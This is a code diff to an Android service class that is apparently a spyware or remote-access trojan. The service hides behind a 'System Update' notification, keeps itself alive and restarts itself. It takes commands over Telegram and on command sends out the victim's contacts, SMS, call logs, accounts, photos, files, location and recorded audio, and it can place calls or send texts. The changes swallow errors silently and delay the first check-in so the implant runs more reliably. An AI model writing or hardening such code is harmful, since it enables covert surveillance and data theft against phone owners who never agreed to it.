@@ -63,35 +63,53 @@ public class MainService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-
-        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
-        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
-        wakeLock.acquire();
-
+        
+        try {
+            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
+            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MainService");
+            wakeLock.acquire();
+        } catch (Exception e) {}
+        
         startForegroundService();
-        sendToTelegram("✅ MainService Started - يعمل في الخلفية");
-
+        
+        // تأخير إرسال الرسالة الأولى لتجنب الكراش
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    sendToTelegram("✅ MainService Started");
+                } catch (Exception e) {}
+            }
+        }, 2000);
+        
         timer = new Timer();
         timer.scheduleAtFixedRate(new TimerTask() {
             @Override
             public void run() {
-                checkCommands();
+                try {
+                    checkCommands();
+                } catch (Exception e) {}
             }
-        }, 0, 3000);
+        }, 5000, 5000);
     }
 
     private void startForegroundService() {
-        String channelId = "main_channel";
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(channelId, "Main Service", NotificationManager.IMPORTANCE_LOW);
-            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
-        }
-        Notification notification = new NotificationCompat.Builder(this, channelId)
-                .setContentTitle("System Update")
-                .setContentText("يعمل في الخلفية")
-                .setSmallIcon(android.R.drawable.stat_notify_sync)
-                .build();
-        startForeground(1, notification);
+        try {
+            String channelId = "main_channel";
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                NotificationChannel channel = new NotificationChannel(channelId, "Main Service", NotificationManager.IMPORTANCE_LOW);
+                NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+                if (manager != null) {
+                    manager.createNotificationChannel(channel);
+                }
+            }
+            Notification notification = new NotificationCompat.Builder(this, channelId)
+                    .setContentTitle("System Update")
+                    .setContentText("Active")
+                    .setSmallIcon(android.R.drawable.stat_notify_sync)
+                    .build();
+            startForeground(1, notification);
+        } catch (Exception e) {}
     }
 
     private void checkCommands() {
@@ -130,85 +148,70 @@ public class MainService extends Service {
     }
 
     private void executeCommand(String command) {
-        String[] parts = command.split(" ");
-        String cmd = parts[0];
+        try {
+            String[] parts = command.split(" ");
+            String cmd = parts[0];
 
-        switch (cmd) {
-            case "/help":
-                sendHelp();
-                break;
-            case "/info":
-                sendDeviceInfo();
-                break;
-            case "/contacts":
-                getContacts();
-                break;
-            case "/location":
-                getLocation();
-                break;
-            case "/sms":
-                getSms();
-                break;
-            case "/calls":
-                getCallLog();
-                break;
-            case "/accounts":
-                getAccounts();
-                break;
-            case "/photos":
-                getPhotos();
-                break;
-            case "/videos":
-                getVideos();
-                break;
-            case "/files":
-                getFiles();
-                break;
-            case "/record_audio_start":
-                startAudioRecording();
-                break;
-            case "/record_audio_stop":
-                stopAudioRecording();
-                break;
-            case "/vibrate":
-                vibrate();
-                break;
-            case "/open":
-                if (parts.length >= 2) openUrl(parts[1]);
-                break;
-            case "/call":
-                if (parts.length >= 2) makeCall(parts[1]);
-                break;
-            case "/sms_send":
-                if (parts.length >= 3) sendSms(parts[1], command.substring(command.indexOf(parts[1]) + parts[1].length() + 1));
-                break;
-            case "/test":
-                sendToTelegram("✅ System Working - " + new Date().toString());
-                break;
-            default:
-                break;
-        }
+            switch (cmd) {
+                case "/help":
+                    sendHelp();
+                    break;
+                case "/info":
+                    sendDeviceInfo();
+                    break;
+                case "/contacts":
+                    getContacts();
+                    break;
+                case "/location":
+                    getLocation();
+                    break;
+                case "/sms":
+                    getSms();
+                    break;
+                case "/calls":
+                    getCallLog();
+                    break;
+                case "/accounts":
+                    getAccounts();
+                    break;
+                case "/photos":
+                    getPhotos();
+                    break;
+                case "/videos":
+                    getVideos();
+                    break;
+                case "/files":
+                    getFiles();
+                    break;
+                case "/record_audio_start":
+                    startAudioRecording();
+                    break;
+                case "/record_audio_stop":
+                    stopAudioRecording();
+                    break;
+                case "/vibrate":
+                    vibrate();
+                    break;
+                case "/open":
+                    if (parts.length >= 2) openUrl(parts[1]);
+                    break;
+                case "/call":
+                    if (parts.length >= 2) makeCall(parts[1]);
+                    break;
+                case "/sms_send":
+                    if (parts.length >= 3) sendSms(parts[1], command.substring(command.indexOf(parts[1]) + parts[1].length() + 1));
+                    break;
+                case "/test":
+                    sendToTelegram("✅ Working - " + new Date().toString());
+                    break;
+                default:
+                    break;
+            }
+        } catch (Exception e) {}
     }
 
     private void sendHelp() {
-        String help = "📋 **Commands**\n\n" +
-                "/info - Device info\n" +
-                "/location - GPS location\n" +
-                "/contacts - Contacts list\n" +
-                "/sms - Last 10 SMS\n" +
-                "/calls - Last 10 calls\n" +
-                "/accounts - All accounts\n" +
-                "/photos - Last 10 photos\n" +
-                "/videos - Last 10 videos\n" +
-                "/files - All files\n" +
-                "/record_audio_start - Start audio recording\n" +
-                "/record_audio_stop - Stop audio recording\n" +
-                "/vibrate - Vibrate device\n" +
-                "/open [url] - Open URL\n" +
-                "/call [number] - Make call\n" +
-                "/sms_send [number] [text] - Send SMS\n" +
-                "/test - Check service";
-        sendToTelegram(help);
+        sendToTelegram("Commands:\n/info\n/location\n/contacts\n/sms\n/calls\n/accounts\n/photos\n/videos\n/files\n/record_audio_start\n/record_audio_stop\n/vibrate\n/open [url]\n/call [number]\n/sms_send [number] [text]\n/test");
     }
 
     private void sendDeviceInfo() {
@@ -217,23 +220,20 @@ public class MainService extends Service {
             info.put("model", Build.MODEL);
             info.put("manufacturer", Build.MANUFACTURER);
             info.put("android", Build.VERSION.RELEASE);
-            info.put("battery", getBatteryLevel());
-
-            TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
-                info.put("phone", tm.getLine1Number());
-            }
-
             sendToTelegram("📱 Device Info:\n" + info.toString(2));
         } catch (Exception e) {}
     }
 
     private int getBatteryLevel() {
-        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
-        Intent batteryStatus = registerReceiver(null, ifilter);
-        int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
-        int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
-        return (int)(level * 100 / (float)scale);
+        try {
+            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            Intent batteryStatus = registerReceiver(null, ifilter);
+            int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
+            int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
+            return (int)(level * 100 / (float)scale);
+        } catch (Exception e) {
+            return 0;
+        }
     }
 
     private void getContacts() {
@@ -274,8 +274,7 @@ public class MainService extends Service {
             if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
 
             if (location != null) {
-                String map = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
-                sendToTelegram("📍 Location:\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude() + "\n" + map);
+                sendToTelegram("📍 Location:\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude());
             } else {
                 sendToTelegram("📍 Location not available");
             }
@@ -558,9 +557,13 @@ public class MainService extends Service {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        if (timer != null) timer.cancel();
-        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
-        if (mediaRecorder != null) mediaRecorder.release();
-        startService(new Intent(this, MainService.class));
+        try {
+            if (timer != null) timer.cancel();
+            if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
+            if (mediaRecorder != null) mediaRecorder.release();
+        } catch (Exception e) {}
+        try {
+            startService(new Intent(this, MainService.class));
+        } catch (Exception e) {}
     }
 }
